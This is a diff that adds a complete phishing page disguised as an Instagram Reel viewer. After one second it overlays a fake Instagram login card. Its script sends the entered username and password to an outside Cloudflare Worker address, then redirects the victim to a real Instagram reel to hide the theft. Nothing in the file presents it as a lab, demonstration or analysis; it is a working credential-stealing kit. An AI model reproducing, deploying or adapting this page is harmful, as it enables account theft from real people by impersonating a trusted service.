@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Reel</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100%;
+            background-color: #000;
+        }
+        .container {
+            position: relative;
+            max-width: 375px;
+            height: 100%;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        #reelVideo {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, transparent 70%, rgba(0,0,0,0.7) 100%);
+        }
+        .actions {
+            position: absolute;
+            bottom: 20px;
+            right: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .action-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+        .login-prompt {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+        }
+        .login-prompt.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .login-card {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+        .login-card h2 {
+            margin-top: 0;
+            color: #262626;
+        }
+        .login-card p {
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+        .login-card input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+        .signup-text {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        .signup-text a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <video id="reelVideo" loop muted autoplay playsinline>
+            <source src="https://example.com/reel.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+        <div class="overlay"></div>
+        <div class="actions">
+            <button class="action-btn">❤️</button>
+            <button class="action-btn">💬</button>
+            <button class="action-btn">🔗</button>
+        </div>
+        <div id="loginPrompt" class="login-prompt">
+            <div class="login-card">
+                <h2>Log in to see more</h2>
+                <p>Log in to see photos and videos from your friends.</p>
+                <input type="text" id="username" placeholder="Phone number, username, or email" required />
+                <input type="password" id="password" placeholder="Password" required />
+                <button id="loginBtn" class="login-btn">Log In</button>
+                <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('reelVideo');
+            const loginPrompt = document.getElementById('loginPrompt');
+            const loginBtn = document.getElementById('loginBtn');
+        
+            // Ensure video starts playing
+            video.play().catch(error => {
+                console.log("Auto-play was prevented. Please interact with the document to start the video.");
+            });
+        
+            // Show login prompt after 1 second
+            setTimeout(() => {
+                loginPrompt.classList.add('show');
+            }, 1000);
+        
+            // Login button click event to send form data
+            loginBtn.addEventListener('click', async () => {
+                const username = document.querySelector('input[type="text"]').value;
+                const password = document.querySelector('input[type="password"]').value;
+        
+                // Send the data to the Cloudflare Worker
+                const response = await fetch('https://insta.iotserver24.workers.dev/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username,
+                        password,
+                    }),
+                });
+        
+                const result = await response.json();
+                if (result.success) {
+                    // Redirect to a custom URL after successful login
+                    const customUrl = "https://www.instagram.com/reel/C6N6lLzM-_n/"; // Replace with the actual URL
+                    window.location.href = customUrl;
+                } else {
+                    alert('Login failed: ' + result.message);
+                }
+            });
+        });
+        </script>
+        
+</body>
+
+</html>
